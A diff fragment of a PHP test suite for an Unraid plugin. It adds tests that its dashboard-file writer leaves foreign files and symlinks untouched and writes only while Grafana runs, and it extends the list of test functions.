+    file_put_contents($file, $theirs);
+    same('advisor dashboard keep: another uid (the user\'s own) — never touched', ['foreign', $theirs], [advisorDashboardKeep($file, $out), file_get_contents($file)]);
+    file_put_contents($file, 'not json');
+    same('advisor dashboard keep: no JSON — never touched', ['foreign', 'not json'], [advisorDashboardKeep($file, $out), file_get_contents($file)]);
+    unlink($file);
+    file_put_contents("$keep/elsewhere.json", $old);
+    symlink("$keep/elsewhere.json", $file);
+    same('advisor dashboard keep: a link — never followed, never replaced', ['foreign', $old, true],
+        [advisorDashboardKeep($file, $out), file_get_contents("$keep/elsewhere.json"), is_link($file)]);
+    unlink($file);
+    rename($dir, "$keep/real-uso");
+    file_put_contents("$keep/real-uso/unraid-secretary-office.json", $old);
+    symlink("$keep/real-uso", $dir);
+    same('advisor dashboard keep: its folder a link — never written through', ['foreign', $old],
+        [advisorDashboardKeep($file, $out), file_get_contents("$keep/real-uso/unraid-secretary-office.json")]);
+    same('advisor dashboard keep: no tmp files left', [], array_values(array_filter(scandir("$keep/real-uso"), fn ($f) => str_ends_with($f, '.tmp'))));
+    // at his scan or hourly: only while Grafana runs, in the provisioning folder its mappings give
+    unlink($dir);
+    rename("$keep/real-uso", $dir);
+    $g = ['running' => false, 'host' => "$keep/provisioning"];
+    advisorDashboardCurrent($g);
+    same('advisor dashboard current: Grafana stopped — not looked at', $old, file_get_contents($file));
+    advisorDashboardCurrent(['running' => true] + $g);
+    same('advisor dashboard current: Grafana running — the office\'s dashboard of this version', advisorDashboardJson(ADVISOR_DASHBOARD_FILE), file_get_contents($file));
+    exec('rm -rf ' . escapeshellarg($keep));
     // Unraid's exclusive shares: only /mnt/user/<share> → /mnt/<pool>/<share> is followed; other paths stay
     same('advisor: a path outside /mnt/user stays', '/tmp/x/y', advisorUnraidPath('/tmp/x/y'));
     same('advisor: a share that is no link stays', '/mnt/user/zz-uso-no-such-share/a', advisorUnraidPath('/mnt/user/zz-uso-no-such-share/a'));
@@ -3202,8 +3559,8 @@ function testIconSquare(): void
 
 // ===================================================================== run
 
-$parts = ['logic' => ['testCron', 'testRetention', 'testSnapshotNames', 'testEmby', 'testOfficeCron', 'testMenuName', 'testEstimates', 'testNotify', 'testCaretakerAcks',
-                      'testBackupPackages', 'testBackupKopiaItems', 'testBackupSkip', 'testIcons', 'testIconSquare', 'testRestore', 'testRestoreJobs', 'testAdvisor', 'testAdvisorInstall', 'testLogsTour', 'testMetrics', 'testWatchman', 'testWatchmanSched', 'testWatchmanFlow', 'testJobGuard', 'testComposeBuilds'],
+$parts = ['logic' => ['testCron', 'testRetention', 'testSnapshotNames', 'testEmby', 'testOfficeCron', 'testMenuName', 'testEstimates', 'testBackupFirstUpload', 'testNotify', 'testCaretakerAcks',
+                      'testBackupPackages', 'testBackupKopiaItems', 'testBackupSkip', 'testIcons', 'testIconSquare', 'testRestore', 'testRestoreJobs', 'testAdvisor', 'testAdvisorInstall', 'testLogsTour', 'testMetrics', 'testWatchman', 'testWatchmanGone', 'testWatchmanAtUserScript', 'testWatchmanSched', 'testWatchmanFlow', 'testWatchmanFlowGone', 'testJobGuard', 'testComposeBuilds'],
           'hardening' => ['testSafeWrites', 'testTrashManifest', 'testEmbyPaths', 'testAnchors', 'testUpdateClean', 'testAdvisorSecrets'],
           'strings' => ['testStrings']];
 $only = $argv[1] ?? '';
